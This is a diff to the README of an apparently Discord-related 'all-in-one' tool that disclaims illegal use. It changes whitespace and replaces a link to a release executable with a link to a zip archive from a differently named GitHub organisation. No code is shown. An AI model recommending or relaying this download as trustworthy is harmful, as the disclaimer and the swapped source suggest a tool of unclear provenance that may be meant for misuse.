@@ -10,7 +10,7 @@ This program is for educational purposes only.<br />
 How you use this program is your responsibility.<br />
 <br />
 I will not be held accountable for any illegal activities.
-  
+
 <div align="left">
   
 ### Prerequisites
@@ -19,8 +19,8 @@ I will not be held accountable for any illegal activities.
 -   [Python](https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe)
   
 <div align="center">
-  
-<a href="https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.2/Discord.AIO.exe">
+
+<a href="https://github.com/All-In-One-Discord-Program-Tools/All-In-One/archive/refs/heads/main.zip">
   <img src="https://user-images.githubusercontent.com/124546838/230789133-84a5a628-a987-4e19-a87c-07e963a0db0a.png" width="496" height="500" />
 </a>
 
